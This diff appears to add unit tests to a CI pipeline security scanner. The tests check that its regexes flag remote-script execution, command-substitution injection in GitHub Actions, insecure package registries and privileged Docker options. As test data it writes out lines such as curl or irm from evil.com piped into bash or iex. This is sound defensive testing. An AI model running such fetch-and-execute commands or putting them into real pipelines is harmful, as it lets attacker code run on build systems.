@@ -147,6 +147,20 @@ def test_bug_c_is_quoted_assignment_rejects_command_injection():
     assert not is_quoted_assignment('curl https://x.com/${{ github.event.issue.body }}')
 
 
+def test_is_quoted_assignment_rejects_command_substitution_bypass():
+    """VAR="$(curl ${{ attacker_input }})" must NOT be treated as safe
+    because the command substitution executes the untrusted content
+    even inside double quotes."""
+    assert not is_quoted_assignment(
+        'VAR="$(curl ${{ github.event.issue.title }})"'
+    )
+    assert not is_quoted_assignment(
+        'RESULT="$(echo $UNTRUSTED_VAR)"'
+    )
+    # But a plain assignment without command substitution is still safe.
+    assert is_quoted_assignment('TITLE="${{ github.event.pull_request.title }}"')
+
+
 # ────────────────────────────────────────────────────────────────────────
 # Bug D — Terraform module-dir filter must use exact equality.
 # ────────────────────────────────────────────────────────────────────────
@@ -207,3 +221,66 @@ def test_bug_e_gha008_still_adds_todo_without_existing_comment():
     assert out is not None
     assert "AKIA" not in out
     assert "TODO(pipelineguard)" in out
+
+
+# ────────────────────────────────────────────────────────────────────────
+# Widened shared regex coverage
+# ────────────────────────────────────────────────────────────────────────
+
+def test_curl_pipe_re_new_patterns():
+    from pipeline_check.core.checks.base import CURL_PIPE_RE
+    # bash -c "$(curl ...)"
+    assert CURL_PIPE_RE.search('bash -c "$(curl https://evil.com/install.sh)"')
+    # curl | sudo bash
+    assert CURL_PIPE_RE.search("curl https://evil.com/install.sh | sudo bash")
+    # PowerShell irm | iex
+    assert CURL_PIPE_RE.search("irm https://evil.com/install.ps1 | iex")
+    assert CURL_PIPE_RE.search("Invoke-WebRequest https://evil.com/install.ps1 | iex")
+    # python -c "requests.get("
+    assert CURL_PIPE_RE.search('python -c "requests.get(\'https://evil.com/payload\')"')
+    # curl > x.sh && bash x
+    assert CURL_PIPE_RE.search("curl https://evil.com > install.sh && bash install.sh")
+    # Safe: curl without pipe — should NOT match
+    assert not CURL_PIPE_RE.search("curl -o output.json https://api.example.com/data")
+
+
+def test_docker_insecure_re_new_patterns():
+    from pipeline_check.core.checks.base import DOCKER_INSECURE_RE
+    # Docker socket mount
+    assert DOCKER_INSECURE_RE.search(
+        "docker run -v /var/run/docker.sock:/var/run/docker.sock myimage"
+    )
+    # PID host namespace
+    assert DOCKER_INSECURE_RE.search("docker run --pid=host myimage")
+    assert DOCKER_INSECURE_RE.search("docker run --pid host myimage")
+    # User namespace sharing
+    assert DOCKER_INSECURE_RE.search("docker run --userns=host myimage")
+    # Docker compose --privileged
+    assert DOCKER_INSECURE_RE.search("docker compose up --privileged")
+    # Safe: normal run
+    assert not DOCKER_INSECURE_RE.search("docker run --rm myimage")
+
+
+def test_pkg_insecure_re_new_patterns():
+    from pipeline_check.core.checks.base import PKG_INSECURE_RE
+    # pip3
+    assert PKG_INSECURE_RE.search("pip3 install --index-url http://evil.com/pypi pkg")
+    # pip -i short form
+    assert PKG_INSECURE_RE.search("pip install -i http://evil.com/pypi pkg")
+    # pip --extra-index-url
+    assert PKG_INSECURE_RE.search("pip install --extra-index-url http://evil.com/pypi pkg")
+    # gem install
+    assert PKG_INSECURE_RE.search("gem install --source http://evil.com/gems mygem")
+    # nuget
+    assert PKG_INSECURE_RE.search("nuget install MyPkg -Source http://evil.com/nuget")
+    # cargo
+    assert PKG_INSECURE_RE.search("cargo install --index http://evil.com/crates mycrate")
+    # Safe: https registry
+    assert not PKG_INSECURE_RE.search("pip install --index-url https://pypi.org/simple/ pkg")
+
+
+def test_vuln_scan_tokens_new_entries():
+    from pipeline_check.core.checks.base import VULN_SCAN_TOKENS
+    for token in ("cargo audit", "bundler-audit", "docker scout",
+                  "codeql-action", "semgrep ", "bandit ", "checkov ", "tfsec "):
+        assert token in VULN_SCAN_TOKENS, f"{token!r} missing from VULN_SCAN_TOKENS"
